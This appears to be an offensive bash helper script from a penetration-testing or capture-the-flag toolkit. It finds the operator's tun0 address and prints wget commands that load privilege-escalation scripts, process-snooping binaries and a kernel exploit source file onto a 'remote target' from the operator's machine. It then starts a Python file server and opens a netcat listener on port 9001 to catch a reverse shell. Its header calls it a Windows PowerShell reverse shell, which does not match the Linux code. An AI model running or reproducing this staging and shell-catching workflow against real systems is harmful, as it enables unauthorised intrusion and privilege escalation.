#!/bin/bash
# coding:UTF-8

# -------------------------------------------------------------------------------------
#                      Windows Powershell Reverse Shell Script
#                BY TERENCE BROADBENT BSC CYBER SECURITY (FIRST CLASS)
# -------------------------------------------------------------------------------------

# -------------------------------------------------------------------------------------
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub                                                               
# Version : 2.0                                                                
# Details : Display the universal banner.
# Modified: N/A                                                               
# -------------------------------------------------------------------------------------

clear

echo "\t\t _     ___ _   _ _   ___  __  _   _ _____ _____ ____    ____  _____ ______     _______ ____   "
echo "\t\t| |   |_ _| \ | | | | \ \/ / | | | |_   _|_   _|  _ \  / ___|| ____|  _ \ \   / / ____|  _ \  "
echo "\t\t| |    | ||  \| | | | |\  /  | |_| | | |   | | | |_) | \___ \|  _| | |_) \ \ / /|  _| | |_) | "
echo "\t\t| |___ | || |\  | |_| |/  \  |  _  | | |   | | |  __/   ___) | |___|  _ < \ V / | |___|  _ <  "
echo "\t\t|_____|___|_| \_|\___//_/\_\ |_| |_| |_|   |_| |_|     |____/|_____|_| \_\ \_/  |_____|_| \_\ "
echo "\t\t                                                                                              "
echo "\t\t                   BY TERENCE BROADBENT BSC CYBER SECURITY (FIRST CLASS)                      "
echo "\n"

# -------------------------------------------------------------------------------------
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub                                                               
# Version : 2.0                                                                
# Details : Describe the current system and user information.
# Modified: N/A                                                               
# -------------------------------------------------------------------------------------

ifconfig tun0 | grep 'inet ' | awk '{print $2}' | sed 's/addr://' > file.txt

echo "Load any of the files below onto the remote target...\n"

filename="file.txt"
while read line
  do echo "Use 'bash' command for best results:-\n"
  echo "wget http://$line:8000/SH/LinEnum.sh     - Basic."
  echo "wget http://$line:8000/SH/LinEnumPlus.sh - Super Recommended."
  echo "wget http://$line:8000/SH/LinPe.sh       - Recommended."
  echo "wget http://$line:8000/SH/coffee.sh      - Highly Recommeded."
  echo "wget http://$line:8000/ELF/pspy32        - Basic."
  echo "wget http://$line:8000/ELF/pspy64        - Recommeded."

  echo "\nKernel Exploits:-\n"
  echo "wget http://$line:8000/KERNALS/Kernal_4_4_0.c - Excellent."
done < $filename

echo ""
exec python -m SimpleHTTPServer > output.txt &
nc -lvnp 9001

#End
